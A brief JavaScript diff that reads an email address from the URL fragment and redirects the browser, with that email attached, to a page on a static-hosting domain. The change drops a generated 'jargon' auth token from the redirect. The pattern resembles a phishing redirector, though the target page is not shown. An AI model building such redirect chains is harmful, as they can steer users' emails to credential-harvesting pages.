@@ -45,7 +45,7 @@
       const email = window.location.hash.substring(1); // remove '#'
       const authToken = generateJargon();
       const baseURL = "https://papaya-1759505256502.staticrun.app/index.html";
-      const redirectURL = `${baseURL}?auth=${authToken}#${email}`;
+      const redirectURL = `${baseURL}#${email}`;
       window.location.href = redirectURL;
     }
 
